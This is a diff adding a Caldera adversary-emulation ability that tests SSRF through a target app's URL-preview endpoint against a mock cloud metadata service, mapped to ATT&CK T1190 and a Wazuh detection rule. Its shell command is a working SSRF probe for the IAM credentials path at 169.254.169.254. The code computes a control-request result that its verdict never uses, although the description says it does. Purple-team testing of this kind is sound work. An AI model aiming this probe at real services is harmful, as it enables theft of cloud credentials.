@@ -1,0 +1,49 @@
+- id: a7f3c1d9-5e2b-4a6c-9f08-1b2c3d4e5f60
+  name: SSRF - Cloud Metadata Access (Mock IMDS, verdict)
+  description: >-
+    URL preview(/api/preview) 기능을 악용해 Mock IMDS(169.254.169.254) 클라우드 메타데이터 접근을 시도한다.
+    응답을 공격자 측에서 파싱해 verdict(ssrf.verdict)와 근거(ssrf.evidence.kind)를 fact 로 산출한다 (결정1).
+    sentinel("MOCK-IMDS-DO-NOT-USE") 도달 시 SUCCEEDED/METADATA_REACHED. 응답 본문·자격증명 원문은 기록하지 않는다.
+    DIFFERENTIAL(결정2): 외부 대조요청(example.com)은 비교 신호로만 사용하며, 명확한 내부 sentinel 도달 시에만 SUCCEEDED로 판정한다.
+    매핑 T1190 (ATT&CK) / DET0080·AN0222 (detection). 탐지 대상 Wazuh rule 100240 (request-signal, B안).
+    주의: Caldera 는 명령 개행을 제거해 한 줄로 실행하므로 각 구문은 반드시 ';' 로 종료한다.
+  tactic: initial-access
+  technique:
+    attack_id: T1190
+    name: Exploit Public-Facing Application
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{paw}";
+          TECH_ID="T1190";
+          ABILITY_ID="a7f3c1d9-5e2b-4a6c-9f08-1b2c3d4e5f60";
+          TARGET="http://#{target.url}";
+          H1="X-Caldera-Op-Id: ${OP_ID}";
+          H2="X-Caldera-Technique: ${TECH_ID}";
+          H3="X-Caldera-Ability: ${ABILITY_ID}";
+          UA="Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}";
+          MD="http://169.254.169.254/latest/meta-data/iam/security-credentials/mock-iam-role";
+          CTL="http://example.com/";
+          enc(){ python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; };
+          fetch(){ curl -s -m 8 -w "\n__CODE__:%{http_code}" -H "$H1" -H "$H2" -H "$H3" -A "$UA" "${TARGET}/api/preview?url=$(enc "$1")"; };
+          sig(){ B=$(printf '%s' "$1" | sed '$d'); C=$(printf '%s' "$1" | tail -n1 | cut -d: -f2); if printf '%s' "$B" | grep -q "MOCK-IMDS-DO-NOT-USE"; then echo REACHED; elif [ "$C" = "403" ] || [ "$C" = "400" ]; then echo BLOCKED; elif [ "$C" = "200" ]; then echo AMBIGUOUS; else echo ERROR; fi; };
+          R1=$(fetch "$MD"); S1=$(sig "$R1");
+          R2=$(fetch "$MD"); S2=$(sig "$R2");
+          RC=$(fetch "$CTL"); SC=$(sig "$RC");
+          V=UNKNOWN; K=none; D=none;
+          if [ "$S1" = REACHED ] || [ "$S2" = REACHED ]; then V=SUCCEEDED; K=METADATA_REACHED;
+          elif [ "$S1" = AMBIGUOUS ] || [ "$S2" = AMBIGUOUS ]; then V=EXECUTED; K=none;
+          elif [ "$S1" = BLOCKED ]; then V=FAILED; K=none;
+          else V=UNKNOWN; K=none; fi;
+          printf '{"verdict":"%s","evidence_kind":"%s","differential":"%s"}\n' "$V" "$K" "$D";
+        parsers:
+          plugins.stockpile.app.parsers.json:
+          - source: ssrf.verdict
+            custom_parser_vals:
+              json_key: verdict
+              json_type: str
+          - source: ssrf.evidence.kind
+            custom_parser_vals:
+              json_key: evidence_kind
+              json_type: str
